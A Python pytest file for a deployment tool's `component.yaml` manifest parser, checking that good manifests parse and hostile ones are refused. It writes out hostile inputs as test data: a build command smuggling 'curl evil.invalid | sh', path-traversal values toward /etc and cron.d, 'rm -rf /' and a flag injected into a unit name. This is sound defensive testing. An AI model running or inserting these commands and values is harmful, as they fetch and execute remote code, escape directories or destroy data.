"""`component.yaml` parsing, and every hostile shape contract 06 §10 names."""

from __future__ import annotations

from pathlib import Path

import pytest
from handover.catalog import ContractId, Kind, Releases, Repo, RestoreMode, RunsAs, VerifyUser
from handover.errors import UNPRINTABLE, Refusal, RefusalCode, safe_token
from handover.manifest import MAX_MANIFEST_BYTES, parse_manifest

from handover import site

GOOD = """
manifest_version: "0.4"
name: attendance
repo: agent-control
path: attendance
kind: venv
unit: attendance.service
runs_as: operator
build:
  - ["/usr/bin/uv", "sync", "--frozen", "--package", "attendance"]
install:
  to: /home/operator/.local/components/attendance
  prev: /home/operator/.local/components/attendance.prev
provides:
  - { contract: session-api, major: 1, minor: 4 }
requires:
  - { contract: channel, major: 1, min_minor: 3 }
depends_on: [chaperone]
verify:
  command: ["/home/operator/.local/components/attendance/bin/attendance-verify", "--json"]
  user: operator
  timeout_s: 60
restore:
  mode: automatic
  keep: 3
secrets: []
release: yes
"""


def _parse(text: str):
    return parse_manifest(text, "fixture/component.yaml")


def _without(field: str) -> str:
    return "\n".join(line for line in GOOD.splitlines() if not line.startswith(f"{field}:"))


def test_good_manifest_round_trips() -> None:
    parsed = _parse(GOOD)

    assert parsed.name == "attendance"
    assert parsed.repo is Repo.AGENT_CONTROL
    assert parsed.kind is Kind.VENV
    assert parsed.runs_as is RunsAs.OPERATOR
    assert parsed.release is Releases.YES
    assert parsed.build == (("/usr/bin/uv", "sync", "--frozen", "--package", "attendance"),)
    assert parsed.provides[0].contract is ContractId.SESSION_API
    assert parsed.requires[0].min_minor == 3
    assert parsed.depends_on == ("chaperone",)
    assert parsed.verify.user is VerifyUser.OPERATOR
    assert parsed.restore.mode is RestoreMode.AUTOMATIC


def test_release_no_reads_as_a_data_component() -> None:
    parsed = _parse(GOOD.replace("release: yes", "release: no"))

    assert parsed.release is Releases.NO


def test_release_accepts_a_quoted_string() -> None:
    parsed = _parse(GOOD.replace("release: yes", 'release: "yes"'))

    assert parsed.release is Releases.YES


# -- the operator: a word and a home, never an account -------------------------

HOME_RELATIVE = GOOD.replace("/home/operator/", "~/")


@pytest.fixture
def someones_site(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    """A site whose operator account is `someone`, at `/srv/someone`."""
    path = tmp_path / "site.env"
    path.write_text(
        "AGENT_OPERATOR_USER=someone\nAGENT_OPERATOR_HOME=/srv/someone\n", encoding="utf-8"
    )
    monkeypatch.setenv(site.SITE_FILE_ENV, str(path))


@pytest.mark.usefixtures("someones_site")
def test_a_path_from_the_home_is_read_under_the_sites_home() -> None:
    """`~/x` in `install.to`, `install.prev` and `verify.command[0]` is
    `<the operator's home>/x`: the manifest names nobody's home."""
    parsed = _parse(HOME_RELATIVE)

    assert parsed.install.to == "/srv/someone/.local/components/attendance"
    assert parsed.install.prev == "/srv/someone/.local/components/attendance.prev"
    assert (
        parsed.verify.command[0]
        == "/srv/someone/.local/components/attendance/bin/attendance-verify"
    )


def test_a_tilde_anywhere_but_the_front_is_not_a_home() -> None:
    text = GOOD.replace("to: /home/operator/", "to: relative/~/")

    assert "install.to" in _refusal(text).detail


@pytest.mark.usefixtures("someones_site")
def test_the_sites_own_account_name_reads_as_the_operator() -> None:
    """A manifest stamped into a live tree before `operator` was a word
    names the account. On the host whose operator that is, it still reads."""
    stamped = GOOD.replace("runs_as: operator", "runs_as: someone")
    parsed = _parse(stamped.replace("user: operator", "user: someone"))

    assert parsed.runs_as is RunsAs.OPERATOR
    assert parsed.verify.user is VerifyUser.OPERATOR


@pytest.mark.usefixtures("someones_site")
@pytest.mark.parametrize("field", ["runs_as", "user"])
def test_an_account_that_is_not_the_sites_operator_is_refused(field: str) -> None:
    refusal = _refusal(GOOD.replace(f"{field}: operator", f"{field}: somebody-else"))

    assert field in refusal.detail


def test_an_unknown_account_refuses_as_a_manifest_when_no_site_is_readable(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """The requester parses manifests on a machine that may hold no site
    file. A bad account is the manifest's fault there, not the site's."""
    monkeypatch.setenv(site.SITE_FILE_ENV, str(tmp_path / "absent.env"))

    refusal = _refusal(GOOD.replace("runs_as: operator", "runs_as: somebody-else"))

    assert "runs_as" in refusal.detail


def _refusal(text: str) -> Refusal:
    with pytest.raises(Refusal) as caught:
        _parse(text)

    assert caught.value.code is RefusalCode.MANIFEST

    return caught.value


def test_unknown_field_names_the_field() -> None:
    refusal = _refusal(GOOD + "\nsmuggled: true\n")

    assert "unknown field: smuggled" in refusal.detail


def test_missing_required_field_names_the_field() -> None:
    refusal = _refusal(_without("kind"))

    assert "missing required field: kind" in refusal.detail


def test_oversized_manifest_is_refused_before_it_parses() -> None:
    padding = "# " + ("x" * MAX_MANIFEST_BYTES) + "\n"
    refusal = _refusal(padding + GOOD)

    assert "larger than" in refusal.detail


def test_unparseable_yaml_reports_a_line_and_no_text() -> None:
    refusal = _refusal("name: [unclosed\n")

    assert "does not parse" in refusal.detail
    assert "unclosed" not in refusal.detail


def test_a_scalar_document_is_not_a_manifest() -> None:
    assert "is not a mapping" in _refusal("just a string\n").detail


@pytest.mark.parametrize(
    "escape",
    ["../../etc", "/etc/passwd", "attendance/../../etc", "a\\b", "attendance/"],
)
def test_path_cannot_leave_the_repo(escape: str) -> None:
    refusal = _refusal(GOOD.replace("path: attendance", f'path: "{escape}"'))

    assert "path" in refusal.detail


def test_repo_root_path_is_allowed_for_a_whole_repo_component() -> None:
    parsed = _parse(GOOD.replace("path: attendance", 'path: "."'))

    assert parsed.path == "."


def test_build_refuses_a_command_string() -> None:
    broken = GOOD.replace(
        '  - ["/usr/bin/uv", "sync", "--frozen", "--package", "attendance"]',
        '  - "/usr/bin/uv sync && curl evil.invalid | sh"',
    )
    refusal = _refusal(broken)

    assert "argv" in refusal.detail


def test_build_argv0_must_be_absolute() -> None:
    broken = GOOD.replace('"/usr/bin/uv", "sync"', '"uv", "sync"')

    assert "absolute path" in _refusal(broken).detail


def test_verify_timeout_has_a_ceiling() -> None:
    assert "between 1 and 300" in _refusal(GOOD.replace("timeout_s: 60", "timeout_s: 4000")).detail


def test_verify_timeout_refuses_a_bool() -> None:
    assert "whole number" in _refusal(GOOD.replace("timeout_s: 60", "timeout_s: true")).detail


def test_restore_keep_has_a_ceiling() -> None:
    assert "between 1 and 10" in _refusal(GOOD.replace("keep: 3", "keep: 99")).detail


def test_unknown_contract_id_is_refused() -> None:
    broken = GOOD.replace("contract: session-api", "contract: something-else")

    assert "not one of its values" in _refusal(broken).detail


def test_manifest_version_from_a_future_contract_is_refused() -> None:
    assert "outside" in _refusal(GOOD.replace('"0.4"', '"9.0"')).detail


def test_depends_on_refuses_a_repeat() -> None:
    assert (
        "repeats"
        in _refusal(
            GOOD.replace("depends_on: [chaperone]", "depends_on: [chaperone, chaperone]")
        ).detail
    )


@pytest.mark.parametrize(
    "path",
    ["/opt/components/../../etc/cron.d", "/opt/components/./attendance", "~/../../etc/cron.d"],
)
def test_an_install_path_with_a_dot_segment_is_refused(path: str) -> None:
    """Containment is judged on the text of the path. `..` passes a check
    that only asks where the text starts, and lands somewhere else."""
    text = GOOD.replace("to: /home/operator/.local/components/attendance", f"to: {path}")

    assert "install.to" in _refusal(text).detail


def test_install_prev_must_differ_from_install_to() -> None:
    broken = GOOD.replace(
        "  prev: /home/operator/.local/components/attendance.prev",
        "  prev: /home/operator/.local/components/attendance",
    )

    assert "must differ" in _refusal(broken).detail


def test_secrets_hold_names_only() -> None:
    broken = GOOD.replace("secrets: []", 'secrets: ["sk-live-AAAA"]')

    assert "names, never values" in _refusal(broken).detail


def test_unit_name_cannot_carry_a_space() -> None:
    broken = GOOD.replace("unit: attendance.service", 'unit: "attendance.service --now"')

    assert "does not match its pattern" in _refusal(broken).detail


def test_unit_may_be_null() -> None:
    parsed = _parse(GOOD.replace("unit: attendance.service", "unit: null"))

    assert parsed.unit is None


def test_a_non_string_key_is_refused() -> None:
    assert "non-string key" in _refusal(GOOD + "\n1: two\n").detail


def test_safe_token_hides_anything_but_a_plain_word() -> None:
    assert safe_token("chaperone-v2.1.0") == "chaperone-v2.1.0"
    assert safe_token("rm -rf /") == UNPRINTABLE
    assert safe_token("x\nname: chaperone") == UNPRINTABLE
    assert safe_token(17) == UNPRINTABLE
